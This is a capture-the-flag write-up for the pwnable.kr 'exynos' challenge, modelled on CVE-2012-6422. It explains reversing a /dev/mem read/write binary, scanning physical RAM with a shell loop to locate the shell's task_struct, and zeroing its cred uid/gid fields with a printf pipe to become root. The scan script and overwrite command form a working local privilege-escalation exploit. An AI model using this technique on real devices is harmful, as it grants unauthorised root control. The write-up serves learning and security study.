Challenge Description

We get the following hint:

How did Samsung accidently mess up their phone?

* there is gcc environment inside the QEMU box.
* no debugging environment is provided.

ssh exynos@pwnable.kr -p2222 (pw: flag of syscall)

Sounds fun!

Accessing it, we get a minimal Linux system (kernel 3.11.4, ARM) with a binary called /exynos-mem. Running it I got:

usage : exynos-mem [phyaddr] [bytesize] [mode(R/W-0/1)]

I reversed it and got this:

int main(int argc, char **argv)
{
  int fd;
  int phyaddr;
  int size;
  int mode;
  char *buf;
  int bytes_processed;

  if (argc == 4) {
    fd = open("/dev/mem", 2);
    phyaddr = strtoul(argv[1], NULL, 0);
    size = strtoul(argv[2], NULL, 0);
    mode = strtoul(argv[3], NULL, 0);
    lseek(fd, phyaddr, 0);
    buf = malloc(size);
    bytes_processed = 0;
    if (mode == 0) {
      read(fd, buf, size);
      bytes_processed = write(1, buf, size);
    }
    else if (mode == 1) {
      read(0, buf, size);
      bytes_processed = write(fd, buf, size);
    }
    else {
      printf("wrong mode. 0:read, 1:write\n");
    }
    printf("processed %d bytes\n", bytes_processed);
  }
  else {
    printf("usage : exynos-mem [phyaddr] [bytesize] [mode(R/W-0/1)]");
  }
  return 0;
}

Noice. So it opens /dev/mem and either reads or writes raw physical memory. Mode 0 reads from a physical address and dumps to stdout, mode 1 reads from stdin and writes to a physical address. What we have here is an arbitrary read and write of the entire physical memory, which is extremely powerful.

What is /dev/mem

/dev/mem is a character device in Linux that provides direct access to the system's physical memory. A character device is a special file that you interact with using regular file operations (open, read, write, lseek), but instead of reading a file on disk, the kernel routes those calls to a driver. In the case of /dev/mem, the file offset maps directly to a physical memory address, so lseek-ing to offset 0x60000000 and reading means you're reading physical RAM at that address.

Understanding the Memory Layout

I used /proc/iomem to see the physical memory layout:

/ $ cat /proc/iomem
60000000-66dfffff : System RAM
  60008000-60485f3f : Kernel code
  604ba000-605065cf : Kernel data

~110MB of RAM starting at physical address 0x60000000. The kernel virtual base on ARM is typically 0x80000000, so converting between virtual and physical is:

physical = virtual - 0x80000000 + 0x60000000

This will come in handy later.

The Plan

Every process in Linux has a task_struct in kernel memory. Inside it there are two pointers, real_cred and cred, that point to a cred struct. The cred struct holds the process's uid, gid, and related fields. If I find my process's cred struct in physical memory and overwrite the uid/gid fields to zero, I can get root.

The relevant structures look like this:

task_struct (relevant fields):
  ...
  const struct cred *real_cred
  const struct cred *cred
  char comm[16]        // process name, sits right after cred
  ...

cred struct:
  +0x00  usage (refcount)
  +0x04  uid
  +0x08  gid
  +0x0c  suid
  +0x10  sgid
  +0x14  euid
  +0x18  egid
  +0x1c  fsuid
  +0x20  fsgid

The comm field sits right after the cred pointers in the task_struct, which is convenient. If I find my process name in memory, the cred pointers are right before it.

The Challenges

A few things made this a bit annoying.

There's no ctrl-c. Pressing ctrl-c exits QEMU entirely, not just the running command. So any long-running scan needs a way to stop gracefully.

There's no /dev/null. My initial idea was to run a process with a unique name in the background, find its task_struct, and escalate its privileges. But without /dev/null I can't really do background processes on this system.

And the shell is just called sh, which isn't a very unique name if I'm going to search multiple megabytes of memory. I need to find my specific shell's task_struct in raw memory.

Making the Shell Findable

After a lot of headache trying to find the "sh" process in the memory, I found a way to change the comm field in the task_struct: write to /proc/self/comm. I had permissions, so:

printf "yael-hamalca" > /proc/self/comm

To verify it worked I used read, since it's a shell builtin and reads the shell's own comm rather than a child process's:

read x < /proc/self/comm
echo $x
# yael-hamalca

At first I tried editing /proc/self/comm with vi, but that only changed vi's own process name, not the shell's. Writing to it directly with printf works because the shell handles the redirect in its own process context.

Scanning Physical Memory

Now I needed to scan through RAM to find my task_struct. The kernel data ends at 0x605065cf and RAM goes up to 0x66dfffff, so task_structs are allocated somewhere in that range. I ran the scan in two separate SSH sessions, one going top-down and one going bottom-up, to cover the range faster. Just a matter of swapping $start and $end in the script.

start=$((0x605065d0))
end=$((0x66dfffff))
chunk=$((0x100000))
count=0
for i in $(seq $end -$chunk $start); do
  echo "Scanning $(printf '0x%x' $i)..."
  result=$(/exynos-mem $i $chunk 0 | hexdump -C | grep "yael")
  if [ -n "$result" ]; then
    echo "$result"
    echo "FOUND near $(printf '0x%x' $i)"
    echo -n "Continue? (y/n): "
    read ans
    [ "$ans" != "y" ] && break
  fi
  count=$((count + 1))
  if [ $((count % 10)) -eq 0 ]; then
    echo "--- Scanned $count chunks so far (at $(printf '0x%x' $i)) ---"
    echo -n "Continue? (y/n): "
    read ans
    [ "$ans" != "y" ] && break
  fi
done

The interactive prompts were necessary since there's no ctrl-c. Every hit and every 10 chunks it asks whether to keep going, so I don't get stuck in an infinite scan (lesson learned the hard way...).

I got a few false positives at first. The first results were just strings from my shell's input history, things like echo "yael-hama" and "yael" showing up in memory buffers. Not the task_struct.

Eventually I found it:

00000030  80 17 5b 83 80 17 5b 83  79 61 65 6c 2d 68 61 6d  |..[...[.yael-ham|
00000040  61 6c 63 61 0a 00 00 00                            |alca....|

Following the Cred Pointer

I dumped a bigger region around the hit:

00000220  20 0d 95 86 20 0d 95 86  28 0d 95 86 28 0d 95 86  | ... ...(...(...|
00000230  80 17 5b 83 80 17 5b 83  79 61 65 6c 2d 68 61 6d  |..[...[.yael-ham|
00000240  61 6c 63 61 0a 00 00 00  00 00 00 00 00 00 00 00  |alca............|

Right before yael-hamalca at offset 0x230 there are two identical pointers: 80 17 5b 83. Little-endian, that's 0x835b1780. These are real_cred and cred, both pointing to the same cred struct (that's normally what happens). This looks really promising.

Converting to physical, as we found earlier: 0x835b1780 - 0x80000000 + 0x60000000 = 0x635b1780.

I dumped it using /exynos-mem:

/exynos-mem $((0x635b1780)) 32 0
00000000  05 00 00 00 e8 03 00 00  e8 03 00 00 e8 03 00 00  |................|
00000010  e8 03 00 00 e8 03 00 00  e8 03 00 00 e8 03 00 00  |................|
00000020  e8 03 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|

e8 03 00 00 is 1000 in decimal, which is the parent sh's uid!! That's it. Refcount of 5, then 8 consecutive e8 03 00 00: uid, euid, gid etc.

Getting Root

Now all that's left to become root is for the shell process struct to have creds zero! I overwrote all 8 uid/gid fields (32 bytes at offset +4, skipping the refcount) with zeros:

printf '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' | /exynos-mem $((0x635b1784)) 32 1

processed 32 bytes
/tmp $ id -u
0
/tmp # cat /root/flag
(redacted)

Hurray!! :)

The Real Vulnerability

The challenge is a reference to CVE-2012-6422. Samsung added a custom device called /dev/exynos-mem to their Exynos 4210/4412 kernel for GPU memory access, and accidentally set its permissions to world-readable/writable. Any app on the phone could open it and read/write all of physical memory. This challenge simulates that same situation.
